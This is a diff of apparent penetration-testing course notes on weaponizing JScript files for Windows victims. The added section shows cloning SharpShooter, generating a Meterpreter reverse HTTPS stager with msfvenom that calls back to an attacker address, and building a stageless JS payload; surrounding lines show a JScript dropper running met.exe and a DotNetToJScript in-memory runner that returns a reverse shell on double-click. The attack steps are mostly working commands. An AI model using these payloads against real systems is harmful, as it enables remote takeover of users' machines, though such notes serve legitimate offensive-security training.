@@ -16,7 +16,29 @@ ___
 ## Description:  
 Look for default apps in windows settings, if the default application for .js files is Windows-Based Script host (should be by default), then our code should run automatically after a double-click.
 
-### Jscript
+### SharpShooter (automated way)
+
+ A payload generation tool called [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) has been created to assist with using DotNetToJscript to weaponize C# compiled assemblies in other file formats (like Jscript, VBScript, and even Microsoft Office macros).
+```
+ kali@kali:~$ cd /opt/
+kali@kali:/opt$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
+Cloning into 'SharpShooter'...
+kali@kali:/opt$ cd SharpShooter/
+kali@kali:/opt/SharpShooter$ sudo pip install -r requirements.txt
+```
+use msfvenom to generate our Meterpreter reverse stager and write the raw output format to a file.
+```
+kali@kali:/opt/SharpShooter$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
+LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
+```
+Now use Sharp Shooter to generate our payload:
+```
+kali@kali:/opt/SharpShooter$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
+```
+
+
+
+### Jscript (Manual and not in memory)
 use msfvenom to generate a 64-bit Meterpreter reverse HTTPS executable named met.exe:
 ```
 kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o met.exe
@@ -46,7 +68,7 @@ var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 ```
 After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the victim’s machine to our awaiting multi/handler listener.
 
-### Using Jscript and C sharp
+### Using Jscript and C sharp (manual and in memory)
 To run our payload completely from memory
 
 Download [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) and open it in visual studio
@@ -126,6 +148,8 @@ Place NDesk.Options.dll and ExampleAssembly.dll next to DotNetToJscript.exe and 
 C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 ```
 With our multi/handler set up, we can double-click the Jscript file. After a brief pause, we should receive the staged reverse Meterpreter shell.
+
+
 
 ___
 
